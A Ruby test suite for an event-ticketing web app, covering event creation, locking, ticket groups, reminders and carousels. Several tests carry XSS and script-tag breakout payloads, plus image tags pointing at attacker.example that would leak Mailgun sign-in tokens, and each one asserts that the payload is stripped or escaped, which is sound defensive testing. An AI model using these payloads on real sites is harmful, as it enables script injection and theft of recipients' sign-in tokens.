require File.expand_path("#{File.dirname(__FILE__)}/test_config.rb")

class EventsTest < ActiveSupport::TestCase
  include Capybara::DSL
  include Rack::Test::Methods

  def fill_event_create_form(event, ticket_type)
    fill_in 'Event title*', with: event.name
    execute_script %{$('#event_start_time').val('#{event.start_time.to_fs(:db_local)}')}
    execute_script %{$('#event_end_time').val('#{event.end_time.to_fs(:db_local)}')}
    fill_in 'Location', with: event.location if event.location
    click_link 'Tickets'
    execute_script %{$("a:contains('Add ticket type')").click()}
    fill_in 'event_ticket_types_attributes_0_name', with: ticket_type.name
    fill_in 'event_ticket_types_attributes_0_price_or_range', with: ticket_type.price_or_range
    fill_in 'event_ticket_types_attributes_0_quantity', with: ticket_type.quantity
    click_link 'Everything else'
  end

  def tag_event(event, tag)
    event.event_tagships.create!(event_tag: tag)
    event.reload
  end

  def tag_carousel(carousel, tag)
    carousel.carouselships.create!(event_tag: tag)
    carousel.sync_tagged_event_carousel_ids_without_delay(tag.id)
    carousel
  end

  def listing_event_ids
    JSON.parse(last_response.body).map { |event| event['id'] }
  end

  test 'creating an event' do
    create_organisation
    event = FactoryBot.build_stubbed(:event)
    ticket_type = FactoryBot.build_stubbed(:ticket_type)
    sign_in(@account)
    visit "/o/#{@organisation.slug}"
    click_link 'Create an event'
    fill_event_create_form(event, ticket_type)
    click_button 'Create event'
    assert page.has_content? 'Add to calendar'
  end

  test 'creating an event with a range' do
    create_organisation
    event = FactoryBot.build_stubbed(:event)
    ticket_type = FactoryBot.build_stubbed(:ticket_type, price_or_range: '10-100')
    sign_in(@account)
    visit "/o/#{@organisation.slug}"
    click_link 'Create an event'
    fill_event_create_form(event, ticket_type)
    click_button 'Create event'
    assert page.has_content? 'Drag the slider'
  end

  test 'editing an event' do
    create_event(prices: [0])
    sign_in(@account)
    visit "/e/#{@event.slug}/edit"
    fill_in 'Event title*', with: (name = FactoryBot.build_stubbed(:event).name)
    click_button 'Update event'
    assert page.has_content? 'The event was saved'
    assert page.has_content? name
  end

  test 'public event submission creates draft and notifies admins' do
    Delayed::Job.delete_all if defined?(Delayed::Job)
    create_organisation(allow_event_submissions: true)
    submitter = FactoryBot.create(:account)
    event = FactoryBot.build_stubbed(:event)

    sign_in(submitter)
    visit "/o/#{@organisation.slug}/events"
    assert page.has_link?('Submit an event for review'), 'Non-admin should see submit button when org allows public submissions'

    click_link 'Submit an event for review'
    fill_in 'Event title*', with: event.name
    execute_script %{$('#event_start_time').val('#{event.start_time.to_fs(:db_local)}')}
    execute_script %{$('#event_end_time').val('#{event.end_time.to_fs(:db_local)}')}
    click_link 'Everything else'
    click_button 'Create event'

    created_event = Event.find_by(name: event.name)
    assert created_event, 'Event should be created'
    assert created_event.locked?, 'Event should be locked when submitted by non-admin'
    assert_equal submitter.id, created_event.account_id, 'Event should be attributed to submitter'
    assert_equal 0, created_event.notifications.and(type: 'created_event').count, 'Locked submission should not create a public event notification'
    assert_equal 1, Delayed::Job.and(handler: /send_public_submission_notification/).count, 'Submission email should be queued'

    visit "/e/#{created_event.slug}/edit"
    assert page.has_content?('Event title'), 'Submitter should be able to access edit page'
    refute page.has_css?('label[for="event_locked"]'), 'Submitter should not see locked checkbox'
    assert page.has_content?('submitted for review'), 'Submitter should see unlock message'
  end

  test 'event admin can lock but only lock admin can unlock' do
    create_organisation(allow_event_submissions: true)
    org_admin = @account
    coordinator = FactoryBot.create(:account)
    create_event(coordinator: coordinator, locked: false, prices: [0])

    assert Event.admin?(@event, coordinator), 'Coordinator should be event admin'
    refute Event.lock_admin?(@event, coordinator), 'Coordinator should not be lock admin'

    # Event admin (coordinator) can lock an unlocked event
    sign_in(coordinator)
    visit "/e/#{@event.slug}/edit"
    assert page.has_css?('label[for="event_locked"]'), 'Event admin should see locked checkbox when event is unlocked'
    find('label[for="event_locked"]').click
    click_button 'Update event'
    assert page.has_content?('The event was saved')
    assert @event.reload.locked?, 'Event should be locked after event admin checks the box'

    # Event admin (coordinator) cannot unlock - checkbox should be hidden
    visit "/e/#{@event.slug}/edit"
    refute page.has_css?('label[for="event_locked"]'), 'Event admin should not see locked checkbox when event is locked (cannot unlock)'
    assert page.has_content?('submitted for review'), 'Non-lock-admin should see unlock message'

    # Lock admin (org admin) can unlock
    sign_in(org_admin)
    visit "/e/#{@event.slug}/edit"
    assert page.has_css?('label[for="event_locked"]'), 'Lock admin should see locked checkbox'
    find('label[for="event_locked"]').click
    click_button 'Update event'
    assert page.has_content?('The event was saved')
    refute @event.reload.locked?, 'Event should be unlocked after lock admin unchecks the box'
  end

  test 'ticket email strips event-handler attributes from editor HTML' do
    create_event(
      prices: [0],
      extra_info_for_ticket_email: '<img src=x onerror=alert(1)><p>Zoom link</p>',
      ticket_email_greeting: '<p>Hello</p><img src=x onerror=alert(1)>'
    )
    order = @event.orders.new(account: @account)
    html = EmailHelper.html(:tickets, event: @event, order: order, account: @account, tickets_table: '', header_image_url: nil)

    refute_match(/onerror/i, html)
    refute_includes html, 'alert(1)'
    assert_includes html, 'Zoom link'
    assert_includes html, 'Hello'
  end

  test 'ticket email strips sign-in tokens from custom html images' do
    create_organisation(show_details_table_in_ticket_emails: true, show_sign_in_link_in_ticket_emails: true)
    create_event(
      name: 'Workshop %recipient.token%',
      prices: [0],
      extra_info_for_ticket_email: '<img src="https://attacker.example/%recipient.tok%recipient.token%en%">'
    )
    order = @event.orders.new(account: @account)
    html = EmailHelper.html(:tickets, event: @event, order: order, account: @account, tickets_table: '', header_image_url: nil)

    refute_match(%r{src="[^"]*%recipient\.token%}, html)
    refute_includes html, 'Workshop %recipient.token%'
    assert_includes html, 'Workshop'
    assert_includes html, 'sign_in_token=%recipient.token%'
  end

  test 'names cannot keep a mailgun recipient token' do
    assert_equal '', EmailHelper.strip_recipient_secrets('%recipient.tok%recipient.token%en%')
    assert_equal 'Workshop', EmailHelper.strip_recipient_secrets('Workshop %recipient.tok%recipient.token%en%').squish

    create_event(name: 'Workshop %recipient.token%', prices: [0])
    @account.update!(name: 'Ada %recipient.token%')
    @organisation.update!(name: 'Org %recipient.token%')

    assert_equal 'Workshop', @event.name
    assert_equal 'Ada', @account.name
    assert_equal 'Org', @organisation.name

    @event.update!(name: 'Workshop %recipient.tok%recipient.token%en%')
    @account.update!(name: 'Ada %recipient.tok%recipient.token%en%')
    @organisation.update!(name: 'Org %recipient.tok%recipient.token%en%')

    assert_equal 'Workshop', @event.name
    assert_equal 'Ada', @account.name
    assert_equal 'Org', @organisation.name

    @event.update!(name: 'Workshop &lt;img src="https://attacker.example/%recipient.token%"&gt;')
    refute_includes @event.name, '%recipient'
  end

  test 'names never keep angle brackets however they were encoded' do
    # Double-encoded so a single decode pass would otherwise leave live markup in the name
    create_event(name: 'Workshop &lt;img src="https://attacker.example/x?t=&amp;#37;recipient.token&amp;#37;"&gt;', prices: [0])
    @account.update!(name: 'Ada &lt;b&gt;Lovelace&lt;/b&gt;')

    refute_match(/[<>]/, @event.name)
    refute_match(/[<>]/, @account.name)
    assert_equal 'Ada', @account.firstname
  end

  test 'json-ld cannot close the script tag' do
    create_event(prices: [0], description: '<p>Welcome</p>')
    # location/website are not name-sanitised; description text is HTML-decoded
    @event.set(location: '</script><img src="https://attacker.example/x">')
    @event.set(description: '<p>&lt;/script&gt;<img src="https://attacker.example/x"></p>')
    @organisation.set(website: 'https://example.com/</script><img src="https://attacker.example/x">')
    @event.reload
    @organisation.reload

    get "/e/#{@event.slug}"
    assert last_response.ok?

    json_ld = last_response.body[%r{<script type="application/ld\+json">\s*(.*?)\s*</script>}m, 1]
    assert json_ld, 'expected JSON-LD block'
    refute_includes json_ld, '</script>'
    assert_includes json_ld, '\u003c/script\u003e'

    parsed = JSON.parse(json_ld)
    assert_equal @event.location, parsed.dig('location', 'name')
    assert_equal @event.organisation.website, parsed.dig('organizer', 'url')
    assert_equal '</script>', parsed['description']
  end

  test 'names are escaped in emails' do
    create_event(prices: [0])
    # Bypass sanitisation: output escaping must hold even for a stored name containing live markup
    @event.set(name: 'Workshop <img src="https://attacker.example/x?t=&#37;recipient.token&#37;">')

    html = EmailHelper.html(:waitlist_tickets_available, event: @event)

    refute_match(/<img[^>]*attacker\.example/, html)
    assert_includes html, 'Workshop &lt;img'
    assert_equal html.scan('sign_in_token=%recipient.token%').size, html.scan('%recipient.token%').size
  end

  test 'youtube titles are escaped in emails' do
    create_event(prices: [0], extra_info_for_ticket_email: '<oembed url="https://www.youtube.com/watch?v=abc123"></oembed>')
    video = Struct.new(:title).new('<img src="https://attacker.example/x?t=%recipient.token%"> & more')
    Yt::Video.stub(:new, video) do
      html = EmailHelper.replace_youtube_oembeds(@event.extra_info_for_ticket_email)

      refute_match(/<img[^>]*attacker\.example/, html)
      refute_includes html, '%recipient.token%'
      assert_includes html, '&lt;img'
      assert_includes html, '&amp; more'
    end
  end

  test 'intentional html still renders in emails' do
    create_organisation(show_details_table_in_ticket_emails: true)
    create_event(name: 'Tom & Jerry', prices: [0], extra_info_for_ticket_email: '<p>See <strong>you</strong> there</p>')
    order = @event.orders.new(account: @account)
    tickets_table = EmailHelper.render(:_tickets_table, event: @event, account: @account)
    html = EmailHelper.html(:tickets, event: @event, order: order, account: @account, tickets_table: tickets_table, header_image_url: nil)

    assert_includes html, 'Tom &amp; Jerry'
    assert_includes html, '<strong>you</strong>'
    assert_includes html, '<table class="event-details"'
  end

  test 'nested ticket type cannot reference another event ticket group' do
    create_event(prices: [0])
    own_group = @event.ticket_groups.create!(name: 'Own', capacity: 10)
    other_organisation = FactoryBot.create(:organisation, account: FactoryBot.create(:account))
    other_event = FactoryBot.create(:event, organisation: other_organisation, prices: [0])
    other_group = other_event.ticket_groups.create!(name: 'Backstage', capacity: 10)
    ticket_type = @event.ticket_types.first

    sign_in_with_rack(@account)
    post "/e/#{@event.slug}/edit", event: {
      ticket_types_attributes: { '0' => { id: ticket_type.id.to_s, name: ticket_type.name, quantity: ticket_type.quantity.to_s, ticket_group_id: other_group.id.to_s } }
    }

    refute last_response.redirect?
    assert_nil ticket_type.reload.ticket_group_id
    assert_empty other_group.tickets

    post "/e/#{@event.slug}/edit", event: {
      ticket_types_attributes: { '0' => { id: ticket_type.id.to_s, name: ticket_type.name, quantity: ticket_type.quantity.to_s, ticket_group_id: own_group.id.to_s } }
    }

    assert last_response.redirect?, last_response.body
    assert_equal own_group.id, ticket_type.reload.ticket_group_id
  end

  test 'nested ticket types and groups cannot be moved to another event' do
    create_event(prices: [0])
    own_group = @event.ticket_groups.create!(name: 'Own', capacity: 10)
    other_organisation = FactoryBot.create(:organisation, account: FactoryBot.create(:account))
    other_event = FactoryBot.create(:event, organisation: other_organisation, prices: [0])
    ticket_type = @event.ticket_types.first

    sign_in_with_rack(@account)
    post "/e/#{@event.slug}/edit", event: {
      ticket_types_attributes: { '0' => { id: ticket_type.id.to_s, name: ticket_type.name, quantity: ticket_type.quantity.to_s, event_id: other_event.id.to_s } },
      ticket_groups_attributes: { '0' => { id: own_group.id.to_s, name: own_group.name, capacity: own_group.capacity.to_s, event_id: other_event.id.to_s } }
    }

    refute last_response.redirect?
    assert_equal @event.id, ticket_type.reload.event_id
    assert_equal @event.id, own_group.reload.event_id
  end

  test 'redirect_url must be a valid http or https URL' do
    create_organisation
    event = FactoryBot.build(:event, organisation: @organisation)

    event.redirect_url = 'https://example.com/thanks'
    assert event.valid?

    event.redirect_url = 'http://example.com/thanks'
    assert event.valid?

    event.redirect_url = 'javascript:alert(document.cookie)'
    refute event.valid?
    assert_includes event.errors[:redirect_url], 'must be a valid http or https URL'

    event.redirect_url = 'data:text/html,<script>alert(1)</script>'
    refute event.valid?

    event.redirect_url = nil
    assert event.valid?
  end

  test 'safe_redirect_url ignores stored javascript URLs' do
    create_event
    @event.set(redirect_url: 'javascript:alert(1)')

    assert_nil @event.reload.safe_redirect_url
    assert_equal 'https://example.org/thanks', @event.tap { |e| e.redirect_url = 'https://example.org/thanks' }.safe_redirect_url
  end

  test 'slug uniqueness includes deleted events' do
    create_event
    slug = @event.slug
    @event.destroy

    assert_nil Event.find_by(slug: slug)
    assert Event.unscoped.and(slug: slug).exists?

    clash = FactoryBot.build(:event, organisation: @organisation, slug: slug)
    refute clash.valid?
    assert clash.errors[:slug].any?
  end

  test 'duplicating an event skips slugs belonging to deleted events' do
    create_event(as: :event1, prices: [0])
    create_event(as: :event2, slug: 'a0aaa')
    @event2.destroy

    candidates = ['a0aaa', 'z9zzz']
    Event.stub :slug_candidate, -> { candidates.shift } do
      duplicate = @event1.duplicate!(@account)
      assert duplicate.persisted?
      assert_equal 'z9zzz', duplicate.slug
    end
  end

  # ═══════════════════════════════════════════════════════════════════════════
  # Reminders and feedback
  # ═══════════════════════════════════════════════════════════════════════════

  test 'reminder is due when its send time falls within the next hour' do
    now = Time.utc(2026, 3, 13, 8, 55, 0)
    event = Event.new(start_time: Time.utc(2026, 3, 13, 10, 0, 0), reminder_hours_before: 1)

    assert event.reminder_due_within?(1.hour, now)
  end

  test 'reminder is not due once the event has started' do
    now = Time.utc(2026, 3, 13, 10, 0, 0)
    event = Event.new(start_time: now - 5.minutes, reminder_hours_before: 1)

    refute event.reminder_due_within?(1.hour, now)
  end

  test 'feedback request is due when its send time falls within the next hour' do
    now = Time.utc(2026, 3, 13, 10, 55, 0)
    event = Event.new(
      organisation: FactoryBot.build_stubbed(:organisation),
      feedback_questions: 'How was it?',
      end_time: Time.utc(2026, 3, 13, 10, 0, 0),
      feedback_hours_after: 1
    )

    assert event.feedback_due_within?(1.hour, now)
  end

  test 'feedback request with blank hours is due at event end' do
    now = Time.utc(2026, 3, 13, 9, 55, 0)
    event = Event.new(
      organisation: FactoryBot.build_stubbed(:organisation),
      feedback_questions: 'How was it?',
      end_time: Time.utc(2026, 3, 13, 10, 0, 0)
    )

    assert event.feedback_due_within?(1.hour, now)
  end

  test 'feedback request is not sent once it has already been sent' do
    now = Time.utc(2026, 3, 13, 10, 55, 0)
    event = Event.new(
      organisation: FactoryBot.build_stubbed(:organisation),
      feedback_questions: 'How was it?',
      end_time: Time.utc(2026, 3, 13, 10, 0, 0),
      feedback_hours_after: 1,
      sent_feedback_requests_at: Time.utc(2026, 3, 13, 10, 0, 0)
    )

    refute event.feedback_due_within?(1.hour, now)
  end

  test 'feedback request bulk task does not reschedule very old pending sends' do
    now = Time.utc(2026, 5, 17, 12, 0, 0)
    event = Event.new(
      organisation: FactoryBot.build_stubbed(:organisation),
      feedback_questions: 'How was it?',
      end_time: Time.utc(2026, 3, 13, 10, 0, 0),
      feedback_hours_after: 0
    )

    refute event.feedback_due_within?(1.hour, now)
  end

  test 'feedback request delay cannot exceed 30 days' do
    event = Event.new(feedback_hours_after: Event::MAX_FEEDBACK_HOURS_AFTER + 1)
    event.valid?

    assert_includes event.errors[:feedback_hours_after], "cannot be more than #{Event::MAX_FEEDBACK_HOURS_AFTER}"
  end

  test 'event gathering must be administered by the last saver' do
    create_event
    other_account = FactoryBot.create(:account)
    other_gathering = FactoryBot.create(:gathering, account: other_account)
    @event.gathering = other_gathering
    @event.last_saved_by = @account

    refute @event.valid?
    assert_includes @event.errors[:gathering], "- you don't have permission to add attendees to this gathering"
  end

  test 'event session create rejects event_id from params' do
    create_event(prices: [0])
    other_event = FactoryBot.create(:event)

    sign_in_with_rack(@account)
    post "/events/#{@event.id}/event_sessions/new", event_session: {
      start_time: (@event.start_time + 1.hour).iso8601,
      end_time: (@event.end_time - 1.hour).iso8601,
      event_id: other_event.id
    }

    assert_equal 1, @event.event_sessions.count
    assert_equal 0, other_event.event_sessions.count
  end

  test 'rpayment edit rejects event_id from params' do
    create_event(prices: [0])
    other_event = FactoryBot.create(:event)
    rpayment = @event.rpayments.create!(account: @account, amount: 10, currency: @event.currency, role: Rpayment.roles.first)

    sign_in_with_rack(@account)
    post "/events/#{@event.id}/rpayments/#{rpayment.id}/edit", rpayment: {
      amount: 10,
      currency: @event.currency,
      role: rpayment.role,
      event_id: other_event.id
    }

    assert_equal @event.id, rpayment.reload.event_id
  end

  test 'tagging an event stores matching organisation carousel ids' do
    create_event
    tag = FactoryBot.create(:event_tag)
    carousel = FactoryBot.create(:carousel, organisation: @organisation)
    tag_carousel(carousel, tag)
    tag_event(@event, tag)

    assert_equal [carousel.id], @event.carousel_ids
  end

  test 'tagging a carousel stores matching event carousel ids' do
    create_event
    tag = FactoryBot.create(:event_tag)
    carousel = FactoryBot.create(:carousel, organisation: @organisation)
    tag_event(@event, tag)
    assert_empty Array(@event.carousel_ids)

    tag_carousel(carousel, tag)
    @event.reload
    assert_equal [carousel.id], @event.carousel_ids
  end

  test 'tagging an event does not store another organisation carousel with the same tag' do
    create_event
    other_organisation = FactoryBot.create(:organisation)
    tag = FactoryBot.create(:event_tag)
    other_carousel = FactoryBot.create(:carousel, organisation: other_organisation)
    tag_carousel(other_carousel, tag)
    tag_event(@event, tag)

    assert_empty Array(@event.carousel_ids)
  end

  test 'cohosting an event adds the cohost organisation carousel ids' do
    create_event
    cohost = FactoryBot.create(:organisation)
    tag = FactoryBot.create(:event_tag)
    carousel = FactoryBot.create(:carousel, organisation: cohost)
    tag_carousel(carousel, tag)
    tag_event(@event, tag)
    assert_empty Array(@event.carousel_ids)

    @event.cohostships.create!(organisation: cohost)
    @event.reload
    assert_equal [carousel.id], @event.carousel_ids
  end

  test 'removing a cohost clears the cohost organisation carousel ids' do
    create_event
    cohost = FactoryBot.create(:organisation)
    tag = FactoryBot.create(:event_tag)
    carousel = FactoryBot.create(:carousel, organisation: cohost)
    tag_carousel(carousel, tag)
    tag_event(@event, tag)
    @event.cohostships.create!(organisation: cohost)
    @event.reload
    assert_equal [carousel.id], @event.carousel_ids

    @event.cohostships.find_by(organisation: cohost).destroy
    @event.reload
    assert_empty Array(@event.carousel_ids)
  end

  test 'removing a tag or carouselship clears carousel ids' do
    create_event
    tag = FactoryBot.create(:event_tag)
    carousel = FactoryBot.create(:carousel, organisation: @organisation)
    tag_carousel(carousel, tag)
    tag_event(@event, tag)
    assert_equal [carousel.id], @event.carousel_ids

    @event.event_tagships.find_by(event_tag: tag).destroy
    @event.reload
    assert_empty Array(@event.carousel_ids)

    tag_event(@event, tag)
    assert_equal [carousel.id], @event.carousel_ids

    carousel.carouselships.find_by(event_tag: tag).destroy
    carousel.sync_tagged_event_carousel_ids_without_delay(tag.id)
    @event.reload
    assert_empty Array(@event.carousel_ids)
  end

  test 'destroying a carousel clears its id from events' do
    create_event
    tag = FactoryBot.create(:event_tag)
    carousel = FactoryBot.create(:carousel, organisation: @organisation)
    tag_carousel(carousel, tag)
    tag_event(@event, tag)
    carousel.destroy
    @event.reload

    assert_empty Array(@event.carousel_ids)
  end

  test 'organisation events json listing filters by stored carousel ids' do
    create_event(as: :matching)
    create_event(as: :other)
    tag = FactoryBot.create(:event_tag)
    carousel = FactoryBot.create(:carousel, organisation: @organisation)
    tag_carousel(carousel, tag)
    tag_event(@matching, tag)

    header 'Referer', "http://example.org/o/#{@organisation.slug}/events"
    get "/o/#{@organisation.slug}/events.json", carousel_ids: [carousel.id.to_s]
    assert last_response.ok?
    assert_includes listing_event_ids, @matching.id.to_s
    refute_includes listing_event_ids, @other.id.to_s
  end

  test 'organisation events json listing ignores another organisation carousel id' do
    create_event
    tag = FactoryBot.create(:event_tag)
    carousel = FactoryBot.create(:carousel, organisation: @organisation)
    tag_carousel(carousel, tag)
    tag_event(@event, tag)
    other_carousel = FactoryBot.create(:carousel, organisation: FactoryBot.create(:organisation))

    header 'Referer', "http://example.org/o/#{@organisation.slug}/events"
    get "/o/#{@organisation.slug}/events.json", carousel_ids: [other_carousel.id.to_s]
    assert last_response.ok?
    refute_includes listing_event_ids, @event.id.to_s
  end
end
